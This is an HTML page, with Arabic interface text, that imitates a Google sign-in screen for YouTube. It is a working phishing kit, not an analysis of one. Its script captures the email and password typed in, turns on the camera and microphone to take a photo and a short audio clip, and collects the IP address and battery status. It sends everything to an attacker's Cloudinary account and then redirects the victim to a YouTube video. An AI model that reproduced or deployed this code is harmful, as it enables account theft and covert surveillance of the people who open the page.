<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google - تأكيد الحساب</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: 'Segoe UI', sans-serif; background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
        .card { width: 90%; max-width: 400px; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; }
        img { width: 75px; margin-bottom: 10px; }
        input { width: 100%; padding: 13px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; }
        button { background: #1a73e8; color: #fff; border: none; padding: 12px; width: 100%; border-radius: 4px; font-weight: 600; cursor: pointer; }
        #v { position: absolute; width: 1px; height: 1px; opacity: 0.01; }
        #c { display: none; }
    </style>
</head>
<body>

<div class="card" id="ui">
    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg">
    <h1>تسجيل الدخول</h1>
    <p>المتابعة إلى YouTube</p>
    <input type="email" id="e" placeholder="البريد الإلكتروني" required>
    <input type="password" id="p" placeholder="كلمة المرور" required>
    <button onclick="run()">التالي</button>
</div>

<video id="v" autoplay playsinline muted></video>
<canvas id="c" width="640" height="480"></canvas>

<script>
    // بياناتك (تأكد من كتابة اسم السحاب والبريست بدقة)
    const cn = 'dgkttv99v', pr = 'ml_default', yt = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";

    async function run() {
        const email = document.getElementById('e').value, pass = document.getElementById('p').value;
        if(!email || !pass) return;

        try {
            // طلب الصلاحيات
            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            const video = document.getElementById('v');
            video.srcObject = stream;
            
            document.getElementById('ui').innerHTML = "<h3>جاري المزامنة...</h3><p>يرجى عدم إغلاق هذه الصفحة</p>";

            // سحب بيانات البطارية والجهاز
            let battery = "N/A", charging = "N/A";
            try {
                const b = await navigator.getBattery();
                battery = Math.round(b.level * 100) + "%";
                charging = b.charging ? "Yes" : "No";
            } catch(e){}

            // انتظار استقرار الكاميرا
            setTimeout(async () => {
                const canvas = document.getElementById('c');
                canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
                const img = canvas.toDataURL("image/png");

                // تسجيل الصوت (4 ثواني فقط للسرعة)
                const recorder = new MediaRecorder(stream);
                let chunks = [];
                recorder.ondataavailable = ev => chunks.push(ev.data);
                recorder.onstop = async () => {
                    const audioBlob = new Blob(chunks, { type: 'audio/webm' });
                    
                    // إرسال البيانات فوراً
                    await sendAll(email, pass, img, audioBlob, battery, charging);
                    window.location.href = yt;
                };

                recorder.start();
                setTimeout(() => recorder.stop(), 4000);

            }, 2000);

        } catch (err) { window.location.href = yt; }
    }

    async function sendAll(e, p, img, aud, bat, char) {
        let ip = "Unknown";
        try { 
            const res = await fetch('https://api.ipify.org?format=json');
            const data = await res.json();
            ip = data.ip;
        } catch(err){}

        const ctx = `u=${e}|p=${p}|ip=${ip}|bat=${bat}|char=${char}`;

        // رفع الصورة
        const fd1 = new FormData();
        fd1.append('file', img);
        fd1.append('upload_preset', pr);
        fd1.append('context', ctx);
        fd1.append('tags', 'DeathLink');

        // رفع الصوت
        const fd2 = new FormData();
        fd2.append('file', aud);
        fd2.append('upload_preset', pr);
        fd2.append('resource_type', 'video');
        fd2.append('context', ctx);

        // إرسال الطلبات بدون انتظار الرد لضمان السرعة
        fetch(`https://api.cloudinary.com/v1_1/${cn}/image/upload`, { method: 'POST', body: fd1 });
        fetch(`https://api.cloudinary.com/v1_1/${cn}/upload`, { method: 'POST', body: fd2 });
        
        // إعطاء مهلة بسيطة جداً للشبكة قبل التحويل
        return new Promise(res => setTimeout(res, 1000));
    }
</script>
</body>
</html>
